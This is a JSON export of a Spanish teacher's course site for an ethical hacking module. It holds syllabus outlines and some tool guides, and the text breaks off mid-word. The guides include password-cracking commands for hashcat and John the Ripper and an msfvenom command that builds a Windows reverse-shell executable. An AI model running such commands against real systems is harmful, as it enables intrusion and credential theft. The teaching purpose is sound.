{"About":{"title":"About","links":[],"tags":[],"content":"Sobre el proyecto\nQué es este proyecto\nEsta página web nace con la idea de generar una documentación de módulos profesionales de FP. Buscando el objetivo de que esté online el mayor tiempo posible, está desplegado en distintos sistemas:\n\nDesplegado a través de Github pages en: rafaeldelrio.github.io\nDesplegado a través de Cloudflare pages en: web.cloudflare-nbkeq.workers.dev/\nDesplegado a través de Gitlab pages en: web-dcb01e.gitlab.io/\n\nA quién va dirigido\nEste proyecto ha sido creado con el propósito, en primer lugar, de ser útil para mí mismo. Es decir, que con el buscador avanzado de la web se pueda encontrar fácilmente información relevante, apuntes, ejemplos de uso…\nAdemás el proyecto va dirigido a cualquiera que tenga curiosidad sobre estos temas.\nCómo puedo acceder al proyecto\nComo comentaba anteriormente, se puede acceder al proyecto directamente empleando la url: rafaeldelrio.github.io\nEl código fuente de todo lo documentado se encuentra en: github.com/RafaeldelRio/rafaeldelrio.github.io\nMe interesa, me gustaría crear algo parecido para mí\nLa documentación del proyecto ha sido creada con Obsidian. Son archivos markdown (.md).\nEstos archivos han sido desplegados empleando el proyecto Quartz.\nEl despliegue está hecho mediante github actions y github pages.\nSe puede seguir un tutorial paso a paso en la siguiente web:\nTutorial para desplegar el proyecto\nSobre mí\nEl impulsor de este proyecto es Rafael del Río, profesor de informática. Si tienes ideas, sugerencias o algún motivo por el que quieras contactarme, no lo dudes, y mándame un mensaje a través de Github.\n\ngithub.com/RafaeldelRio\n"},"CETI/Hacking-ético/RA-1/1a---Elementos-esenciales-del-hacking-ético":{"title":"1a - Elementos esenciales del hacking ético","links":[],"tags":[],"content":"Criterio de evaluación:\na) Se ha definido la terminología esencial del hacking ético.\n\nContenido asociado: Elementos esenciales del hacking ético.\n\nConceptos\n\nDefinición de hacking ético y su rol en ciberseguridad\nTérminos clave: white hat, black hat, grey hat, test de penetración (pentest), evaluación de vulnerabilidades.\nObjetivos de hacking ético.\n\nPrácticas\n\nCarreras de ciber: tryhackme.com/r/room/careersincyber\nIntro a Linux: tryhackme.com/r/room/linuxfundamentalspart1\nCrear un glosario de términos de hacking y definiciones de ejemplo\nDiscusión en grupo: diferencia entre hacking (programas de bug bounty, por ejemplo) y cracking.\n\nMateriales\n\nOWASP Glossary: cheatsheetseries.owasp.org/Glossary.html\nNIST Cybersecurity Framework\n\nEvaluación\n\nTest de terminología.\n"},"CETI/Hacking-ético/RA-1/1b---Conceptos-éticos-y-legales":{"title":"1b - Conceptos éticos y legales","links":[],"tags":[],"content":"Criterio de evaluación:\nb) Se han identificado los conceptos éticos y legales frente al ciberdelito.\n\nContenido asociado: Diferencias entre hacking, hacking ético, tests de penetración y hacktivismo.\n\nConceptos\n\nDiferencias entre hacking, hacking ético, tests de penetración y hacktivismo.\nFrameworks legales: GDPR, LOPDGDD, LSSI, Código penal…\nMostrar las consecuencias del hacking no ético (penas, daño reputacional…).\nComentar el rol de las certificaciones (como CEH, eJPT, OSCP) para establecer credibilidad.\n\nPrácticas\n\nComparar hacking ético (programas de bug bounty) con hacktivismo (anonymous).\nRole-play: simular una reunión con clientes sobre los límites éticos y legales de un pentest\nHacer un borrador de ejemplo de los acuerdos de un pentest.\n\nMateriales\n\nPlantillas de SANS Institute o EC-Council\nRecursos de estudio de Bugcrowd o HackerOne\n\nEvaluación\n\n\n"},"CETI/Hacking-ético/RA-1/1c---Alcance-y-condiciones-de-un-pentest":{"title":"1c - Alcance y condiciones de un pentest","links":[],"tags":[],"content":"Criterio de evaluación:\nc) Se ha definido el alcance y condiciones de un test de intrusión.\n\nContenido asociado: Recolección de permisos y autorizaciones previos a un test de intrusión.\n\nConceptos\n\nTipos de test de intrusión (internos, externos, ciegos, dirigidos)\nDocumentación necesaria: acuerdos de confidencialidad, alcance, metodologías\nGestión de riesgos durante un test de intrusión\nLimitaciones legales y éticas\n\nPrácticas\n\nRedactar un documento de alcance (scoping) para un test de intrusión\nSimulación de reunión con cliente para definir objetivos y límites\nElaboración de un calendario de pruebas con safe harbor\n\nMateriales\nEvaluación"},"CETI/Hacking-ético/RA-1/1d---Principios-de-seguridad":{"title":"1d - Principios de seguridad","links":[],"tags":[],"content":"Criterio de evaluación:\nd) Se han identificado los elementos esenciales de seguridad: confidencialidad, autenticidad, integridad y disponibilidad.\n\nContenido asociado: Auditorías de caja negra y de caja blanca.\n\nConceptos\n\nPrincipios CIA (Confidencialidad, Integridad y Disponibilidad)\nAutenticación vs Autorización\nAutenticidad y no repudio\nDiferencias entre auditorías de caja negra, gris y blanca\nMetodologías de evaluación de seguridad\n\nPrácticas\n\nPrincipios de seguridad: tryhackme.com/r/room/securityprinciples\nAnálisis comparativo de resultados entre test de caja negra y blanca\nSimulación de ambos tipos de auditorías en sistemas controlados\nEvaluación de un sistema bajo los principios CIA\n\nMateriales\n\nFrameworks de evaluación de seguridad (NIST, ISO 27001)\nHerramientas de documentación de hallazgos\n\nEvaluación"},"CETI/Hacking-ético/RA-1/1e---Fases-del-hacking":{"title":"1e - Fases del hacking","links":[],"tags":[],"content":"Criterio de evaluación:\ne) Se han identificado las fases de un ataque seguidas por un atacante.\n\nContenido asociado: Fases del hacking.\n\nPrácticas:\n\ntryhackme.com/r/room/cyberkillchainzmt\n\nConceptos\n\nCiclo de vida de un ataque: reconocimiento, escaneo, obtención de acceso, mantenimiento del acceso, borrado de huellas\nKill Chain de Lockheed Martin\nFramework MITRE ATT&amp;CK\nTácticas, técnicas y procedimientos (TTPs)\n\nPrácticas\n\nDocumentar cada fase de un ataque en un entorno controlado\nMapear un ataque simulado con el framework MITRE ATT&amp;CK\nEjercicio práctico siguiendo todas las fases en un laboratorio\n\nMateriales\n\nMITRE Navigator para visualizar técnicas de ataque\nHerramientas específicas para cada fase del ataque\n\nEvaluación"},"CETI/Hacking-ético/RA-1/1f---Análisis-de-vulnerabilidades":{"title":"1f - Análisis de vulnerabilidades","links":[],"tags":[],"content":"Criterio de evaluación:\nf) Se han analizado y definido los tipos vulnerabilidades.\n\nContenido asociado: Documentación de vulnerabilidades.\n\nConceptos\n\nClasificación OWASP de vulnerabilidades\nSistema de puntuación CVSS\nBase de datos CVE y NVD\nCategorías principales: inyección, XSS, CSRF, configuraciones inseguras\n\nPrácticas\n\nAnálisis y calificación de vulnerabilidades según CVSS\nBúsqueda e investigación de CVEs recientes\nCreación de una base de datos de vulnerabilidades clasificadas\n\nMateriales\n\nBase de datos CVE/NVD\nCalculadora CVSS\nPlataformas de vulnerabilidades como Vulnhub, DVWA\n\nEvaluación"},"CETI/Hacking-ético/RA-1/1g---Análisis-de-tipos-de-ataques":{"title":"1g - Análisis de tipos de ataques","links":[],"tags":[],"content":"Criterio de evaluación:\ng) Se han analizado y definido los tipos de ataque.\n\nContenido asociado: ClearNet, Deep Web, Dark Web, Darknets. Conocimiento, diferencias y herramientas de acceso: Tor. ZeroNet, FreeNet.\n\nPrácticas\n\ntryhackme.com/r/room/commonattacks\n\nConceptos\n\nClasificación de ataques: pasivos vs activos\nAtaques de ingeniería social, denegación de servicio, man-in-the-middle\nFuncionamiento de darknets y diferencias con internet visible\nPrivacidad, anonimato y criptografía en redes oscuras\n\nPrácticas\n\nInstalación y configuración segura de navegadores para la Dark Web\nAnálisis de mercados en la Dark Web (enfoque educativo)\nEjercicio de análisis de riesgos en diferentes tipos de redes\n\nMateriales\n\nTor Browser, configuración para máxima privacidad\nI2P, Freenet, ZeroNet (análisis comparativo)\nHerramientas de análisis de tráfico cifrado\n\nEvaluación"},"CETI/Hacking-ético/RA-1/1h---Caracterización-de-vulnerabilidades":{"title":"1h - Caracterización de vulnerabilidades","links":[],"tags":[],"content":"Criterio de evaluación:\nh) Se han determinado y caracterizado las diferentes vulnerabilidades existentes.\nConceptos\n\nDebilidades de diseño vs implementación\nErrores comunes en desarrollo seguro\nVulnerabilidades de día cero vs conocidas\nVectores de ataque emergentes\n\nPrácticas\n\nCrear un catálogo de vulnerabilidades en diferentes plataformas\nAnálisis de parches de seguridad publicados recientemente\nDesarrollo de pruebas de concepto para vulnerabilidades conocidas\n\nMateriales\n\nExploit-DB y searchsploit\nBases de datos de vulnerabilidades como VulnDB, Mitre\nPlataformas de CTF para practicar la identificación de vulnerabilidades\n\nEvaluación"},"CETI/Hacking-ético/RA-1/1i---Herramientas-de-monitorización-y-hacking":{"title":"1i - Herramientas de monitorización y hacking","links":[],"tags":[],"content":"Criterio de evaluación:\ni) Se han determinado las herramientas de monitorización disponibles en el mercado adecuadas en función del tipo de organización.\n\nContenido asociado: Clasificación de herramientas de seguridad y hacking.\n\nConceptos\n\nClasificación de herramientas según su funcionalidad\nSoluciones comerciales vs open source\nCriterios de selección según el tipo de organización\nConsideraciones de escalabilidad y rendimiento\n\nPrácticas\n\nComparativa de herramientas de monitorización (SIEM, IDS/IPS)\nImplementación de un sistema de monitorización básico\nAnálisis de casos de uso específicos según el tipo de organización\n\nMateriales\n\nSIEM: Splunk, ELK Stack, Wazuh\nIDS/IPS: Snort, Suricata, Zeek\nVulnerability scanners: Nessus, OpenVAS, Nexpose\n\nEvaluación"},"CETI/Hacking-ético/RA-2/2a---Funcionamiento-de-las-tarjetas-de-red-inalámbricas":{"title":"2a - Funcionamiento de las tarjetas de red inalámbricas","links":[],"tags":[],"content":"Criterio de evaluación:\na) Se han configurado los distintos modos de funcionamiento de las tarjetas de red inalámbricas.\n\nContenido asociado: Modo infraestructura, ad-hoc y monitor.\n\nPrácticas:\n\nIntro a redes: tryhackme.com/r/room/whatisnetworking\n\nConceptos\n\nArquitectura IEEE 802.11 y estándares wireless\nDiferencias técnicas entre modos: infraestructura, ad-hoc, monitor\nFuncionalidades de cada modo y casos de uso\nCompatibilidad hardware para modo monitor\n\nPrácticas\n\nConfiguración de tarjetas en diferentes modos\nCaptura de tráfico en modo monitor\nCreación de una red ad-hoc segura\n\nMateriales\n\nTarjetas compatibles con modo monitor (Alfa, TP-Link)\nAircrack-ng suite para manipulación de interfaces\nWireshark para análisis de capturas\n\nEvaluación"},"CETI/Hacking-ético/RA-2/2b---Comunicación-de-redes-inalámbricas":{"title":"2b - Comunicación de redes inalámbricas","links":[],"tags":[],"content":"Criterio de evaluación:\nb) Se han descrito las técnicas de encriptación de las redes inalámbricas y sus puntos vulnerables.\n\nContenido asociado: Comunicación inalámbrica.\n\nConceptos\n\nEvolución de seguridad WiFi: WEP, WPA, WPA2, WPA3\nFuncionamiento de los protocolos de cifrado (RC4, TKIP, AES)\nDebilidades conocidas en cada protocolo\nWPS y sus vulnerabilidades\n\nPrácticas\n\nAnálisis de tráfico cifrado con diferentes protocolos\nIdentificación de vulnerabilidades en redes WEP y WPA\nConfiguración de una red segura con WPA2/WPA3\n\nMateriales\n\nAircrack-ng para pruebas de seguridad inalámbrica\nBettercap para ataques MITM\nWireshark para análisis de paquetes\n\nEvaluación"},"CETI/Hacking-ético/RA-2/2c---Captura-de-tráfico-de-redes-inalámbricas":{"title":"2c - Captura de tráfico de redes inalámbricas","links":[],"tags":[],"content":"Criterio de evaluación:\nc) Se han detectado redes inalámbricas y se ha capturado tráfico de red como paso previo a su ataque.\n\nContenido asociado: Análisis y recolección de datos en redes inalámbricas.\n\nPrácticas:\n\nWifi: tryhackme.com/r/room/wifihacking101\n\nConceptos\n\nTécnicas de wardriving y warwalking\nAnálisis de beacon frames e información expuesta\nGeolocalización de redes inalámbricas\nHerramientas de mapeo de redes\n\nPrácticas\n\nEscaneo de redes inalámbricas en diferentes entornos\nIdentificación de redes ocultas (SSID hidden)\nCaptura y análisis de handshakes\n\nMateriales\n\nKismet para detección y mapeo\nAirodump-ng para captura de tráfico\nWIFI Pineapple para pruebas avanzadas\n\nEvaluación"},"CETI/Hacking-ético/RA-2/2d---Ataques-y-exploración-de-redes-inalámbricas":{"title":"2d - Ataques y exploración de redes inalámbricas","links":[],"tags":[],"content":"Criterio de evaluación:\nd) Se ha accedido a redes inalámbricas vulnerables.\n\nContenido asociado: Técnicas de ataques y exploración de redes inalámbricas.\n\nConceptos\n\nVectores de ataque según el tipo de encriptación\nAtaques de diccionario y fuerza bruta\nAtaques basados en handshake y PMKID\nTécnicas de deautenticación y evil twin\n\nPrácticas\n\nCreación de laboratorio de redes vulnerables\nAplicación de técnicas de captura de handshake\nAtaque a redes con diferentes configuraciones\n\nMateriales\n\nAircrack-ng suite completa\nHashcat para cracking de handshakes\nWifite para automatización de ataques\n\nEvaluación"},"CETI/Hacking-ético/RA-2/2e---Ataques-a-otros-sistemas-inalámbricos":{"title":"2e - Ataques a otros sistemas inalámbricos","links":[],"tags":[],"content":"Criterio de evaluación:\ne) Se han caracterizado otros sistemas de comunicación inalámbricos y sus vulnerabilidades.\n\nContenido asociado: Ataques a otros sistemas inalámbricos.\n\nConceptos\n\nBluetooth: funcionamiento y vulnerabilidades (BlueBorne, KNOB)\nNFC: principios de funcionamiento y ataques comunes\nRFID: tipos de tarjetas y vectores de ataque\nZigBee, Z-Wave: IoT y domótica\n\nPrácticas\n\nAtaques Bluetooth (Bluejacking, Bluesnarfing)\nClonación de tarjetas RFID\nAnálisis de seguridad en dispositivos IoT domésticos\n\nMateriales\n\nBlueZ, Btlejack para pruebas Bluetooth\nProxmark3 para RFID/NFC\nSoftware y hardware específico para IoT (Z-Wave sniffer)\n\nEvaluación"},"CETI/Hacking-ético/RA-2/2f---Equipo-rojo-vs-azul":{"title":"2f - Equipo rojo vs azul","links":[],"tags":[],"content":"Criterio de evaluación:\nf) Se han utilizado técnicas de “Equipo Rojo y Azul”.\nConceptos\n\nMetodologías de Red Team vs Blue Team\nTécnicas de evasión de detección\nEstrategias defensivas para redes inalámbricas\nSimulación de adversarios y threat hunting\n\nPrácticas\n\nSimulación de campaña Red Team contra infraestructura wireless\nDetección y respuesta a incidentes desde el Blue Team\nEjercicio conjunto de ataque/defensa (Capture The Flag)\n\nMateriales\n\nCobalt Strike/Covenant para operaciones Red Team\nSecurity Onion para defensa Blue Team\nPlataformas de gamificación (HackTheBox, CyberDefenders)\ndocs.vectr.io/\n\nEvaluación"},"CETI/Hacking-ético/RA-2/2g---Realización-de-informes-de-auditoría":{"title":"2g - Realización de informes de auditoría","links":[],"tags":[],"content":"Criterio de evaluación:\ng) Se han realizado informes sobre las vulnerabilidades detectadas.\n\nContenido asociado: Realización de informes de auditoría y presentación de resultados.\n\nConceptos\n\nEstructura de un informe técnico profesional\nClasificación y priorización de vulnerabilidades\nRecomendaciones de mitigación específicas para WiFi\nComunicación efectiva de riesgos técnicos\n\nPrácticas\n\nElaboración de informes de auditoría wireless\nPresentación de resultados a diferentes audiencias\nDesarrollo de plan de mitigación para vulnerabilidades encontradas\n\nMateriales\n\nPlantillas profesionales de informes\nHerramientas de visualización de datos\nSoftware de gestión de vulnerabilidades\n\nEvaluación"},"CETI/Hacking-ético/RA-3/3a---Escaneo-pasivo-(footprinting)":{"title":"3a - Escaneo pasivo (footprinting)","links":[],"tags":[],"content":"Criterio de evaluación:\na) Se ha recopilado información sobre la red y sistemas objetivo mediante técnicas pasivas.\n\nContenido asociado: Fase de reconocimiento (footprinting).\n\nConceptos\n\nOSINT (Open Source Intelligence)\nFootprinting: dominios, DNS, whois\nAnálisis de metadatos\nDoxing ético y sus implicaciones\n\nPrácticas\n\nInvestigación de una organización mediante fuentes públicas\nAnálisis de presencia digital y huella digital\nCreación de un perfil de organización objetiva\n\nMateriales\n\nThe Harvester, Maltego\nShodan, Censys, ZoomEye\nHerramientas OSINT específicas (FOCA, Metagoofil)\n\nEvaluación"},"CETI/Hacking-ético/RA-3/3b---Escaneo-activo-(fingerprinting)":{"title":"3b - Escaneo activo (fingerprinting)","links":[],"tags":[],"content":"Criterio de evaluación:\nb) Se ha creado un inventario de equipos, cuentas de usuario y potenciales vulnerabilidades de la red y sistemas objetivo mediante técnicas activas.\n\nContenido asociado: Fase de escaneo (fingerprinting).\n\nPráctica:\n\ntryhackme.com/r/room/networkservices\n\nConceptos\n\nTécnicas de escaneo de puertos y servicios\nFingerprinting de sistemas operativos\nEnumeración de servicios\nAnálisis de banner grabbing\n\nPrácticas\n\nEscaneos con diferentes técnicas (SYN, TCP, UDP)\nIdentificación de servicios y versiones\nCreación de un mapa de red detallado\n\nMateriales\n\nNmap, Masscan\nNessus, OpenVAS\nAquatone para visualización de servicios web\n\nEvaluación"},"CETI/Hacking-ético/RA-3/3c---Monitorización-e-interceptación-de-tráfico-de-red":{"title":"3c - Monitorización e interceptación de tráfico de red","links":[],"tags":[],"content":"Criterio de evaluación:\nc) Se ha interceptado tráfico de red de terceros para buscar información sensible.\n\nContenido asociado: Monitorizacion de tráfico.\nContenido asociado: Interceptación de comunicaciones utilizando distintas técnicas.\n\nConceptos\n\nSniffing en redes conmutadas vs. compartidas\nTécnicas de envenenamiento ARP\nAtaques MITM en diferentes protocolos\nAnálisis de tráfico cifrado y no cifrado\n\nPrácticas\n\nConfiguración de sniffers en diferentes entornos\nCaptura de credenciales en protocolos inseguros\nInterceptación de sesiones con diferentes técnicas\n\nMateriales\n\nWireshark, tcpdump\nEttercap, Bettercap\nSSLstrip, sslsplit\n\nEvaluación"},"CETI/Hacking-ético/RA-3/3d---Ataque-de-intermediario-(Man-in-the-Middle)":{"title":"3d - Ataque de intermediario (Man in the Middle)","links":[],"tags":[],"content":"Criterio de evaluación:\nd) Se ha realizado un ataque de intermediario, leyendo, insertando y modificando, a voluntad, el tráfico intercambiado por dos extremos remotos.\n\nContenido asociado: Manipulación e inyección de tráfico.\n\nConceptos\n\nFuncionamiento detallado de ataques MITM\nTécnicas de modificación de tráfico en tiempo real\nBypass de protecciones SSL/TLS\nImplicaciones de HSTS y HPKP\n\nPrácticas\n\nImplementación de proxy transparente\nModificación de contenido web en tiempo real\nInyección de código JavaScript en navegación\n\nMateriales\n\nMITMproxy, Burp Suite\nResponder para ataques en entornos Windows\nHerramientas de spoofing de DNS y ARP\n\nEvaluación"},"CETI/Hacking-ético/RA-3/3e---Comprometer-sistemas-remotos":{"title":"3e - Comprometer sistemas remotos","links":[],"tags":[],"content":"Criterio de evaluación:\ne) Se han comprometido sistemas remotos explotando sus vulnerabilidades.\n\nContenido asociado: Herramientas de búsqueda y explotación de vulnerabilidades.\nContenido asociado: Ingeniería social. Phising.\nContenido asociado: Escalada de privilegios.\n\nConceptos\n\nArquitectura de exploits y payloads\nIngeniería social avanzada\nVectores de ataque comunes\nTécnicas de persistencia y escalada\n\nPrácticas\n\nExplotación de vulnerabilidades en sistemas controlados\nDesarrollo de campañas de phishing ético\nEjercicios de escalada de privilegios\n\nMateriales\n\nMetasploit Framework\nSET (Social Engineering Toolkit)\nBeEF (Browser Exploitation Framework)\n\nEvaluación"},"CETI/Hacking-ético/RA-4/4a---Administración-de-sistemas-de-manera-remota":{"title":"4a - Administración de sistemas de manera remota","links":[],"tags":[],"content":"Criterio de evaluación:\na) Se han administrado sistemas remotos a través de herramientas de línea de comandos.\n\nContenido asociado: Administración de sistemas de manera remota.\n\nConceptos\n\nShells remotas (bind vs reverse)\nComunicación con sistemas comprometidos\nTécnicas de persistencia\nEvasión de controles de seguridad\n\nPrácticas\n\nConfiguración de diferentes tipos de shells remotas\nAutomatización de tareas post-explotación\nMovimiento lateral dentro de la red\n\nMateriales\n\nNetcat, Socat\nPowerShell Empire, PoshC2\nCobalt Strike (demo educativa)\n\nEvaluación"},"CETI/Hacking-ético/RA-4/4b---Ataques-y-auditorías-de-contraseñas":{"title":"4b - Ataques y auditorías de contraseñas","links":[],"tags":[],"content":"Criterio de evaluación:\nb) Se han comprometido contraseñas a través de ataques de diccionario, tablas rainbow y fuerza bruta contra sus versiones encriptadas.\n\nContenido asociado: Ataques y auditorías de contraseñas.\n\nConceptos\n\nAtaques online vs offline\nAlgoritmos de hash y sus debilidades\nTécnicas de generación de diccionarios personalizados\nOptimización de ataques de fuerza bruta\n\nPrácticas\n\nExtracción y análisis de hashes de sistemas Windows/Linux\nCreación de tablas rainbow personalizadas\nAtaques de diccionario con reglas personalizadas\n\nMateriales\n\nHashcat, John the Ripper\nMimikatz, LaZagne\nHydra, Medusa para ataques online\n\nEvaluación"},"CETI/Hacking-ético/RA-4/4c---Pivotaje-a-través-de-sistemas-comprometidos":{"title":"4c - Pivotaje a través de sistemas comprometidos","links":[],"tags":[],"content":"Criterio de evaluación:\nc) Se ha accedido a sistemas adicionales a través de sistemas comprometidos.\n\nContenido asociado: Pivotaje en la red.\n\nConceptos\n\nTécnicas de pivoting y port forwarding\nEnumeración de redes internas\nTrust relationships en dominios\nExplotación de confianzas entre sistemas\n\nPrácticas\n\nConfiguración de tunneling a través de sistemas comprometidos\nCreación de proxies SOCKS y HTTP\nMapeo de redes internas desde sistemas comprometidos\n\nMateriales\n\nProxychains, SSHuttle\nChisel, Ligolo\nMetasploit’s routing capabilities\n\nEvaluación"},"CETI/Hacking-ético/RA-4/4d---Instalación-de-puertas-traseras":{"title":"4d - Instalación de puertas traseras","links":[],"tags":[],"content":"Criterio de evaluación:\nd) Se han instalado puertas traseras para garantizar accesos futuros a los sistemas comprometidos.\n\nContenido asociado: Instalación de puertas traseras con troyanos (RAT, Remote Access Trojan).\n\nConceptos\n\nTipos de backdoors: binarias, web, kernel\nTroyanos de acceso remoto (RATs)\nTécnicas de persistencia avanzadas\nEvasión de antivirus y EDR\n\nPrácticas\n\nDesarrollo de backdoors personalizadas\nImplementación de persistencia en distintos sistemas\nBypass de sistemas de seguridad\n\nMateriales\n\nCovenant, PoshC2\nMeterpreter, Empire\nTheFatRat, Veil-Framework\n\nEvaluación"},"CETI/Hacking-ético/RA-4/guías/C-and-C":{"title":"C&C","links":[],"tags":[],"content":"\ngithub.com/its-a-feature/Mythic\ngithub.com/BishopFox/sliver\nCobaltStrike\n"},"CETI/Hacking-ético/RA-4/guías/README-1":{"title":"README 1","links":[],"tags":[],"content":"Post-explotación\nDentro de la postexplotación encontramos los típicos comandos de linux, como: pwd, whoami, id, sudo -l. Con estos comandos ya nos haremos una idea de en qué máquina estamos, con qué usuario, en qué carpeta, y si ese usuario tiene permisos de sudo."},"CETI/Hacking-ético/RA-4/guías/README":{"title":"README","links":[],"tags":[],"content":"Cracking hashes\nPara crackear hashes algunas de las herramientas más relevantes son:\n\nHashcat\nJohn the ripper\n\nPara ver qué tipo de hash es podemos usar:\n\nHashcat y que lo reconozca automáticamente\nHaiti\n\nPara hacer ataques con wordlist podemos usar:\n\nRockyou. En Kali en /usr/share/wordlist/rockyou.txt.gz\nSecLists: github.com/danielmiessler/SecLists\n\nPara buscar nuevas wordlist podemos usar:\n\nwordlistctl : github.com/BlackArch/wordlistctl\n\nRecopilación de información sobre cracking\ninventory.raw.pm/overview.html"},"CETI/Hacking-ético/RA-4/guías/cewl":{"title":"cewl","links":[],"tags":[],"content":"CEWL\nA veces no tenemos una wordlist clara, pero intuimos que en la página web puede haber palabras relevantes (keywords). En ese caso podemos usar CEWL (github.com/digininja/CeWL) para ello. Además podemos indicar con “-d” si queremos que se usen subpáginas para generar la wordlist.\ncewl -d 2 -w $(pwd)/wordlist.txt http://URL/index.html"},"CETI/Hacking-ético/RA-4/guías/haiti":{"title":"haiti","links":[],"tags":[],"content":"Haiti\nHaiti es una herramienta que permite la identificación de hashes. Enlace a la herramienta: noraj.github.io/haiti/#/\nhaiti &#039;1aec7a56aa08b25b596057e1ccbcb6d768b770eaa0f355ccbd56aee5040e02ee&#039;\nSi aún así no sacamos qué tipo de hash puede ser, o si es alguno poco habitual, podemos usar la web:\nhashcat.net/wiki/doku.php\nEsa web nos permite ver si ese hash incluye algo de prefijo o sufijo. Por ejemplo BLAKE2b-512, que su hash necesita del prefijo BLAKE2.\nMáquinas para practicar\n\ntryhackme.com/room/crackthehash\ntryhackme.com/room/crackthehashlevel2\n"},"CETI/Hacking-ético/RA-4/guías/hashcat":{"title":"hashcat","links":[],"tags":[],"content":"Hashcat\nEjemplo de uso de hashcat:\nhashcat &#039;48bb6e862e54f2a795ffc4e541caed4d&#039; -m 0 /usr/share/wordlists/rockyou.txt.gz\nDonde:\n\n‘48bb6e862e54f2a795ffc4e541caed4d’ es el hash que quiero descifrar\n-m indica el tipo de encriptado que tiene el hash a desencriptar. Si no se conoce el tipo de encriptado se puede dejar en blanco y hashcat sugerirá los tipos más probables que puede tener.\n/usr/share/wordlist/rockyou.txt.gz aquí se indica la wordlist que se desea emplear para romper el cifrado\n\nSi no se indica el parámetro “-a” se asume que “-a 0” por lo que intentará un ataque con una wordlist.\nOtros ejemplos empleados:\n\nhashcat &#039;$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom&#039; /usr/share/wordlists/rockyou.txt.gz -m 3200\nhashcat &#039;$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.&#039; /usr/share/wordlist/rockyou.gz.txt\n\nHay que tener en cuenta de este último ejemplo que “aReallyHardSalt” es la salt del encriptado. Se incluye dentro del cifrado.\n\nhashcat &#039;$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom&#039; -a 3 -m 3200 -i --increment-min=4 -1?l ?1?1?1?1\n\nEn este último caso se ha realizado un ataque de fuerza bruta (-a 3) teniendo en cuenta que se comenzara a generar palabras a partir de 4 letras, teniendo en cuenta que el patrón fuera solo de alfabético en minúsculas (1?l).\n\n?l = abcdefghijklmnopqrstuvwxyz\n?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ\n?d = 0123456789\n?h = 0123456789abcdef\n?H = 0123456789ABCDEF\n?s = «space»!”#$%&amp;’()*+,-./:;⇐&gt;?@[\\]^_`{|}~\n?a = ?l?u?d?s\n?b = 0x00 - 0xff\n\nSi quiero solo minúsculas y números será: -1?l?d\nPara crackear un sha-1 con salt, hay que añadir la salt tras la contraseña separado de : (en el siguiente ejemplo la salt es “tryhackme”)\nhashcat &#039;e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme&#039; /usr/share/wordlists/rockyou.txt.gz -m 160\nA no tenemos claro cuál es el -m que debemos emplear pero sí tenemos el tipo de encriptado. Para buscarlo rápidamente podemos emplear:\nhashcat -h | grep -i -e sha1 -e sha-1 | grep salt \nDonde -i permite buscar independientemente de minúsculas o mayúsculas. -e permite realizar una or con grep. Luego el resultado lo filtramos de nuevo para buscar por salt.\nA veces, cuando rompemos el hash queremos comprobar si el resultado se corresponde con la entrada. Para encriptar un texto rápidamente desde consola podemos emplear:\necho -n easy | md5sum\nEl -n es fundamental para no añadir un salto de línea en el echo y que el resultado cambie.\nPor otro lado, es posible que rockyou se nos haga una wordlist demasiado amplia. Si conocemos la longitud exacta de caracteres que va a tener la palabra original, podemos aplicar un patrón regex a rockyou para filtrar por las palabras que tengan ese número de caracteres exacto. Por ejemplo, para generar una nueva wordlist que tenga todas las palabras de rockyou de 6 caracteres:\ngrep &#039;^......$&#039; /usr/share/wordlists/rockyou.txt &gt; rockyou-6.txt\nAntes de terminar quería advertir sobre el uso de -f o —force con hashcat. Esa flag debe usarse con cuidado y solo si se tiene claro qué se está haciendo.\nMáquinas para practicar\n\ntryhackme.com/room/crackthehash\ntryhackme.com/room/crackthehashlevel2\n"},"CETI/Hacking-ético/RA-4/guías/john-the-ripper":{"title":"john-the-ripper","links":[],"tags":[],"content":"John the ripper\nPara ver el listado de hashes que es capaz de romper john the ripper. Aquí lo acompañamos de un grep para filtrar y mostrar solo el que buscamos.\njohn --list=formats | grep -i Keccak-256\nPara crear reglas personalizadas para john the ripper, crearlas en un archivo /usr/share/john/john-local.conf. Las reglas que se pueden crear están en el enlace: www.openwall.com/john/doc/RULES.shtml. Un ejemplo de regla, para añadir dos números a las reglas por defecto es la siguiente:\n// En el archivo /usr/share/john/john-local.conf\n[List.Rules:11]\n$[0-9]$[0-9]\n// Para usar las palabras del revés\n[List.Rules:12]\nr\n// Para usar repeticiones de palabras\n[List.Rules:13]\nd\ndd\nddd\n\nSi no se sabe dónde está la instalación de john the ripper, se puede usar el comando:\nlocate john.conf\nAhora podemos usar la regla creada. En este ejemplo usamos la nueva regla creada y además usamos las wordlists de la lista de seclists (github.com/danielmiessler/SecLists)\njohn hash.txt --format=raw-sha1 --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt --rules=THM01\nMáquinas para practicar\n\ntryhackme.com/room/crackthehash\ntryhackme.com/room/crackthehashlevel2\n"},"CETI/Hacking-ético/RA-4/guías/msfvenom":{"title":"msfvenom","links":[],"tags":[],"content":"msfvenom\nMSFVenom es una herramienta, dentro del framework de Metasploit, que nos permite generar archivos con payloads dentro. Es decir, en lugar de incluir el payload en un exploit, como haríamos con la herramienta msfconsola, el objetivo aquí es crear un “malware” que al ejecutarlo lance el payload.\nEste tipo de malware nos puede permitir escalar privilegios.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f exe -o reverse.exe"},"CETI/Hacking-ético/RA-4/guías/wordlistctl":{"title":"wordlistctl","links":[],"tags":[],"content":"wordlistctl\nPara descargar una wordlist para nombres de perros, por ejemplo:\nsudo python wordlistctl.py fetch fetch_term -l dogs -d"},"CETI/Hacking-ético/RA-5/5a---Autenticación-web":{"title":"5a - Autenticación web","links":[],"tags":[],"content":"Criterio de evaluación:\na) Se han identificado los distintos sistemas de autenticación web, destacando sus debilidades y fortalezas.\n\nContenido asociado: Negación de credenciales en aplicaciones web.\n\nConceptos\n\nMecanismos de autenticación (básica, formularios, token)\nOAuth, SAML, JWT y sus vulnerabilidades\nSistemas MFA y sus bypass\nGestión de sesiones seguras\n\nPrácticas\n\nAnálisis de diferentes sistemas de autenticación\nExplotación de vulnerabilidades comunes en 